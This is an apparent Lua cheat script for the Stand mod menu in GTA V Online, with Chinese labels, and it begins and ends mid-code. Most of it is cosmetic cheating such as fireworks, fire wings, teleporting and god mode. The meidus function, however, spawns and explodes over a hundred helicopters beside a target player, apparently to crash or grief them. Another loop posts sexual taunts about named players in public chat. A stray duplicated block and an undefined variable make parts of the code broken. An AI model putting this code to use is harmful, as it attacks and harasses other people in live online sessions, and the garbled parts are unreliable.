    "ar_prop_ar_tube_cross",
    "ar_prop_ar_tube_fork",
    "ar_prop_ar_tube_gap_02",
    "ar_prop_ar_tube_hg",
    "ar_prop_ar_tube_jmp",
    "ar_prop_ar_tube_l",
    "ar_prop_ar_tube_m",
    "ar_prop_ar_tube_qg",
    "ar_prop_ar_tube_s",
    "ar_prop_ar_tube_speed",
    "ar_prop_ar_tube_xs",
    "ar_prop_ar_tube_xxs"
}
placed_firework_boxes = {}
ptfx_asset = "scr_indep_fireworks"
effect_name = "scr_indep_firework_trailburst"
effect_stuff = {
    {"吸毒驾车", "DrugsDrivingIn"}, 
    {"吸毒的崔佛", "DrugsTrevorClownsFight"},
    {"吸毒的麦克", "DrugsMichaelAliensFight"},
    {"小查视角(红绿色盲)", "ChopVision"},
    {"默片", "DeathFailOut"},
    {"黑白", "HeistCelebPassBW"},
    {"横冲直撞", "Rampage"},
    {"我的眼镜在哪里？", "MenuMGSelectionIn"},
    {"梦境", "DMT_flight_intro"},
}
gConfig = {
	controls = {
		vehicleweapons 		= 86,
		airstrikeaircraft 	= 86
	},
	general = {
		standnotifications 	= false,
		displayhealth 		= true,
		language 		= "english",
		developer		= false, 	-- developer flag (enables/disables some debug features)
		showintro		= true
	},
	ufo = {
		disableboxes 		= false, 	-- determines if boxes are drawn on players to show their position
		targetplayer		= false 	-- wether tractor beam only targets players or not
	},
	vehiclegun = {
		disablepreview 		= false,
	},
	jhengpos = {
		x = 0.41,
		y = 0.07
	},
}
local ufo = util.joaat("sum_prop_dufocore_01a")
local dufo = util.joaat("imp_prop_ship_01a")
local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
function anfangyanhua()
    local animlib = 'anim@mp_fireworks'
    local ptfx_asset = "scr_indep_fireworks"
    local anim_name = 'place_firework_3_box'
    local effect_name = "scr_indep_firework_trailburst"
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)
    local ped = players.user_ped()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    util.yield(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    util.yield(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end
function yanhuafashe(f)
    if #placed_firework_boxes == 0 then 
        notification("请先安放烟花!",colors.green)
        return 
    end
    request_ptfx_asset(ptfx_asset)
    notification("烟花发射wow",colors.red)
    for i=1, 50 do
        for k,box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end
    end
    for k,box in pairs(placed_firework_boxes) do 
        entities.delete_by_handle(box)
        placed_firework_boxes[box] = nil
    end
end
function saving_settings_to_file()
    local filehandle = io.open(settings_filepath, "w")
    if filehandle then
        for setting, value in pairs(settings) do
            filehandle:write(setting.."="..tostring(value).."\n")
        end
        filehandle:close()
    else
        util.toast("Error saving settings to settings file.")
    end
end
function zdgbsyj()
local current_vehicle = get_vehicle_ped_is_in(players.user_ped())
    if current_vehicle ~= 0 then
        if last_vehicle_with_radio_off ~= current_vehicle and VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(current_vehicle) then
            if C_AUDIO.IS_VEHICLE_RADIO_ON(current_vehicle) then
                util.yield(1000)
                AUDIO.SET_RADIO_TO_STATION_NAME("OFF")
                announce("Radio off")
            end
            last_vehicle_with_radio_off = current_vehicle
        end
    else
        last_vehicle_with_radio_off = 0
    end
end
function huonan(on)
    ped_flags[430] = on
    if on then
        menu.trigger_commands("godmode off")
        FIRE.START_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 0, false)
        menu.trigger_commands("demigodmode on")
    else
        FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, false, false, false, false, false, 0, false)
        menu.trigger_commands("godmode on")
    end
end
ped_flags[430] = on
    if on then
        menu.trigger_commands("godmode off")
        FIRE.START_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 0, false)
        menu.trigger_commands("demigodmode on")
    else
        FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, false, false, false, false, false, 0, false)
        menu.trigger_commands("godmode on")
    end
local function get_entity_owner(addr)
    if util.is_session_started() and not util.is_session_transition_active() then
        local netObject = memory.read_long(addr + 0xD0)
        if netObject == 0 then
            return -1
        end
        local owner = memory.read_byte(netObject + 0x49)
        return owner
    end
    return players.user()
end
local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end
local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end
local window_x = 0.01
local window_y = 0.03
local text_margin = 0.003
local text_height = 0.018 
local window_width = 0.12
local window_height = 0.2
local menu_items = {
    "加入群聊",
    "qq群",
    "198651882"
   
}
local selected_index = 0

local blur_rect_instance

local function colour(r, g, b, a)
    return { 
        r = r / 255,
        g = g / 255,
        b = b / 255,
        a = a / 255
    }
end

local function gui_background(x, y, width, height, blur_radius)
    local background = colour(10, 0, 10, 100)

    local border_color_left = colour(255, 0, 255, 255)
    local border_color_right = colour(0, 0, 0, 255)

    directx.blurrect_draw(
        blur_rect_instance, 
        x, y, width, height,
        blur_radius or 5
    )

    directx.draw_rect(
        x, y,
        width, height,
        background
    )

    directx.draw_line(
        x, y,
        x, y + height,
        border_color_left
    )

    
    directx.draw_line(
        x, y,
        x + width, y,
        border_color_left, border_color_right
    )

    directx.draw_line(
        x + width, y,
        x + width, y + height,
        border_color_right
    )

   
    directx.draw_line(
        x, y + height,
        x + width, y + height,
        border_color_left, border_color_right
    )
end
local function text(text, x, y, text_scale, highlighted)
    if highlighted then
        directx.draw_rect(
            x, y,
            window_width - (text_margin * 2), text_height,
            colour(15, 15, 15, 0)
        )
    end
    directx.draw_text(
        x, y, text, ALIGN_TOP_LEFT, text_scale,
        colour(255, 255, 255, 255)
    )
end
local function render_list(x, y, list, selected_index)
    local ty = 0
    local text_scale = 0.5 
    for i,v in pairs(list) do
        local highlighed = i == selected_index - 1

        text(v, x, y + ty, text_scale, highlighed)
        ty = ty + text_height
    end
end
local function edition_string()
    local edition = menu.get_edition()
    if edition == 0 then
        return "免费版"
    elseif edition == 1 then
        return "基础版"
    elseif edition == 2 then
        return "荔枝版"
    elseif edition == 3 then
        return "毒毒版"
    end
end
local function render_menu()
    local width = window_width
    local height = window_height
    gui_background(window_x, window_y,
        width, height)
    text("Stand " .. edition_string(),
        window_x + text_margin,
        window_y + text_margin,
        0.6, false)
    local top_margin = 0.025
    
    render_list(
        window_x + text_margin,
        window_y + text_margin + top_margin,
        menu_items, selected_index
    )
end
local function set_menu_open(toggle) end 
local menu_is_open = false
local function input_handler()
    if menu.is_open() then return end
    local VK_NUMPAD8 = 0x68
    local VK_NUMPAD2 = 0x62
    if util.is_key_down(VK_NUMPAD2) then
        selected_index = selected_index + 1
    elseif util.is_key_down(VK_NUMPAD8) then
        selected_index = selected_index - 1
    end
end
local function tick_handler()
    if menu_is_open then
        render_menu()
    end
    input_handler()
    return true
end
blur_rect_instance = directx.blurrect_new()
util.create_tick_handler(tick_handler) 
function set_menu_open(toggle)
    if toggle and not menu_is_open then
        menu_is_open = true
    elseif not toggle and menu_is_open then
        menu_is_open = false
    end
end
function meidus(pid)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            util.yield(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            util.yield(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        util.yield(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    util.toast("Finished!")
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil
	
end
function guikefanghu(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("开启龟壳防护", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("关闭龟壳防护", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end
function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end
	local Languages = {
	{ Name = "简中", Key = "zh-CN" },
}
local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}
for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end
table.sort(LangKeys)
function encode(text)
	return string.gsub(text, "%s", "+")
end
function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end
local overlay_x = 0.0052
local overlay_y = 0.18519
local run = true
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0
local function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end
function show_custom_alert_until_enter(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_string(l1)
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        util.yield()
    end
end
function zidongfanzhuan()
local player_vehicle = get_vehicle_ped_is_in(players.user_ped(), false)
    local rotation = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local heading = v3.getHeading(v3.new(rotation))
    local vehicle_distance_to_ground = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(player_vehicle)
    local am_i_on_ground = vehicle_distance_to_ground < 2 --and true or false
    local speed = ENTITY.GET_ENTITY_SPEED(player_vehicle)
    if not VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(player_vehicle) and ENTITY.IS_ENTITY_UPSIDEDOWN(player_vehicle) and am_i_on_ground then
        VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(player_vehicle, 5.0)
        ENTITY.SET_ENTITY_HEADING(player_vehicle, heading)
        util.yield()
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(player_vehicle, speed)
    end
end
function shechuNPC()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 
		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)
	end
end
function xuanbuxingxingwei(toggled)
local old_player_name
        local player_name
        local hooker_models ={
        "S_F_Y_Hooker_01",
        "S_F_Y_Hooker_02",
        "S_F_Y_Hooker_03"
        }
        while toggled do
            for _, pid in ipairs(players.list(true, true, true)) do
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
                for i, hooker in ipairs(hooker_models) do
                    local hooker_ped = util.joaat(hooker)
                    if ENTITY.GET_ENTITY_MODEL(VEHICLE.GET_PED_IN_VEHICLE_SEAT(player_veh, 0)) == hooker_ped then
                        player_name = players.get_name(pid)
                        if player_name != old_player_name then
                            util.yield()
                            chat.send_message(player_name .. " 即将与一个妓女发生性关系", false, true, true)
                            old_player_name = player_name
                        end
    
                    end
                end
            end
            util.yield(100)
        end
    end
    function Get_Waypoint_Pos2()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            return waypoint_pos
        else
            util.toast("标点啊吊毛")
        end
    end

    CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300

FRAME_STP = false

--preload
DR_TXT_SCALE = 0.5

--preload
EP_drawveh = true
EP_drawped = true
EP_drawobj = true
EP_drawpick = true
----
EPS_vehx = 0.0
EPS_vehy = 0.03
--
EPS_pedx = 0.0
EPS_pedy = 0.05
--
EPS_objx = 0.0
EPS_objy = 0.07
--
EPS_pickx = 0.0
EPS_picky = 0.09
--

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

function onStartup()
    SE_LocalPed = GetLocalPed()
end

onStartup()
   

local getEntityCoords = ENTITY.GET_ENTITY_COORDS

local function onStartup()
    SE_LocalPed = GetLocalPed()
end

onStartup()

function EaseOutCubic(x)
    return 1 - ((1-x) ^ 3)
end
function EaseInCubic(x)
    return x * x * x
end
function EaseInOutCubic(x) --Thank you QUICKNET for re-writing this function!
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end
local WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end

function DoesTableContainValue(table, value)
    for _, v in pairs(table) do
        if v == value then return true end
    end
    return false
end

function GetValueIndexFromTable(table, value)
    for i, v in pairs(table) do
        if v == value then return i end
    end
    return nil
end

FRAME_STP = false
    function SmoothTeleportToCord(v3coords, teleportFrame)
        local wppos = v3coords
        local localped = getPlayerPed(players.user())
        if wppos ~= nil then
            if not CAM.DOES_CAM_EXIST(CCAM) then
                CAM.DESTROY_ALL_CAMS(true)
                CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                CAM.SET_CAM_ACTIVE(CCAM, true)
                CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
            end
            --
            if teleportFrame then
                util.create_tick_handler(function ()
                    if CAM.DOES_CAM_EXIST(CCAM) then
                        local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then 
                            ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) 
                        else
                            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                            ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false)
                        end
                    else
                        return false
                    end
                end)
            end
            --
            local pc = getEntityCoords(getPlayerPed(players.user()))
            --
            for i = 0, 1, STP_SPEED_MODIFIER do 
                CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
                directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, WhiteText, false)
                local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
                CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
                wait()
            end
    
            local currentZ = CAM.GET_CAM_COORD(CCAM).z
            local coordDiffx = wppos.x - pc.x
            local coordDiffxy = wppos.y - pc.y
            for i = 0, 1, STP_SPEED_MODIFIER / 2 do 
                CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
                wait()
            end
           
            local success, ground_z
            repeat
                STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
                success, ground_z = util.get_ground_z(wppos.x, wppos.y)
                util.yield()
            until success
            if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then
                ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) 
            else
                local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                local v3Out = memory.alloc()
                local headOut = memory.alloc()
                PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
                local head = memory.read_float(headOut)
                memory.free(headOut)
                memory.free(v3Out)
                ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false)
                ENTITY.SET_ENTITY_HEADING(veh, head)
            end
            wait()
            local pc2 = getEntityCoords(getPlayerPed(players.user()))
            local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
            local camcoordz = CAM.GET_CAM_COORD(CCAM).z
          
            for i = 0, 1, STP_SPEED_MODIFIER / 2 do
                local pc23 = getEntityCoords(getPlayerPed(players.user()))
                CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
                wait()
            end
    
            wait()
    
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
            if CAM.IS_CAM_ACTIVE(CCAM) then
                CAM.SET_CAM_ACTIVE(CCAM, false)
            end
            CAM.DESTROY_CAM(CCAM, true)
        else
            util.toast("没标点！")
        end
    end
    function elqs()
        vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
        VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
        PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
        util.yield(500)
        request_ptfx_asset(burning_man_ptfx_asset)
                for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
        GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
                    local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
                    fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
                    looped_ptfxs[#looped_ptfxs+1] = fx
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
              end
        end
        
function juqishoulai()
    if PAD.IS_CONTROL_PRESSED(1, 323) then
                    while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
                        STREAMING.REQUEST_ANIM_DICT("random@mugging3")
                        util.yield(100)
                    end
                    if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                        WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
                        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
                        STREAMING.REMOVE_ANIM_DICT("random@mugging3")
                        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
                    end
                end
                if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                    TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
                    PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
                end
    end
function Disbet(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local play = ENTITY.GET_ENTITY_COORDS(playerped, true)
    local disbet = SYSTEM.VDIST2(play.x, play.y, play.z, tar1.x, tar1.y, tar1.z)
    return disbet
end
function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
    callback()
    end)
end
function cq01()
    local health = ENTITY.GET_ENTITY_HEALTH(players.user_ped())
    if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) == health then return end
    ENTITY.SET_ENTITY_HEALTH(players.user_ped(), health + 5, 0)
    util.yield(255)
end
function healthincover()
    if PED.IS_PED_IN_COVER(players.user_ped(), false) then
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 1.0)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 15.0)
	else
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 0.5)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
	end
end
function gen_fren_funcs(name)
	local balls = menu.list(frendlist,name, {"friend "..name}, "", function(); end)
	menu.divider(balls ,name)
	menu.action(balls,"加入战局", {"jf "..name}, "",function()
		menu.trigger_commands("join "..name)
	end)
	menu.action(balls,"观看玩家", {"sf "..name}, "",function()
		menu.trigger_commands("namespectate "..name)
	end)
	menu.action(balls,"邀请到战局", {"if "..name}, "",function()
		menu.trigger_commands("invite "..name)
	end)
	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()
		menu.trigger_commands("nameprofile "..name)
	end)
end
function get_friend_count()
    native_invoker.begin_call();native_invoker.end_call("203F1CFD823B27A4");
    return native_invoker.get_return_value_int();
end
function get_frined_name(friendIndex)
    native_invoker.begin_call();native_invoker.push_arg_int(friendIndex);native_invoker.end_call("4164F227D052E293");return native_invoker.get_return_value_string();
end
function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end
obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}
opt_pp = {"小吊", "中吊", "大吊", "嘎掉吊"}
function cq02(index, value, click_type)
    pluto_switch index do
        case 1:
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            break
        case 2:
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            break
        case 3:
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            break
        case 4:
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
            break
        end
    end
    local new = {}
    function new.colour(R, G, B, A)
        return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
    end
    mildOrangeFire = new.colour( 255, 127, 80 )
        function loadModel(hash)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
        end
        expSettings = {
            camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
            colour = new.colour( 255, 0, 255 )
        }
    local fireWings = {
        [1] = {pos = {[1] = 120, [2] =  75}},
        [2] = {pos = {[1] = 120, [2] = -75}},
        [3] = {pos = {[1] = 135, [2] =  75}},
        [4] = {pos = {[1] = 135, [2] = -75}},
        [5] = {pos = {[1] = 180, [2] =  75}},
        [6] = {pos = {[1] = 180, [2] = -75}},
        [7] = {pos = {[1] = 195, [2] =  75}},
        [8] = {pos = {[1] = 195, [2] = -75}},
    }
    fireWingsSettings = {
        scale = 0.3,
        colour = mildOrangeFire,
        on = false
    }
    local ptfxEgg
    function firewing(toggle)
        fireWingsSettings.on = toggle
        if fireWingsSettings.on then
            ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
            if ptfxEgg == nil then
                local eggHash = 1803116220
                loadModel(eggHash)
                ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
            end
            for i = 1, #fireWings do
                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                    util.yield()
                end
                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)
    
                util.create_tick_handler(function()
                    local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                    ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                    for i = 1, #fireWings do
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                    end
                    ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                    return fireWingsSettings.on
                end)
            end
        else
            for i = 1, #fireWings do
                if fireWings[i].ptfx then
                    GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                    fireWings[i].ptfx = nil
                end
                if ptfxEgg then
                    entities.delete_by_handle(ptfxEgg)
                    ptfxEgg = nil
                end
            end
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        end
    end
    function get_hud_colour()
        local red_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Red")
        local green_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Green")
        local blue_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Blue")
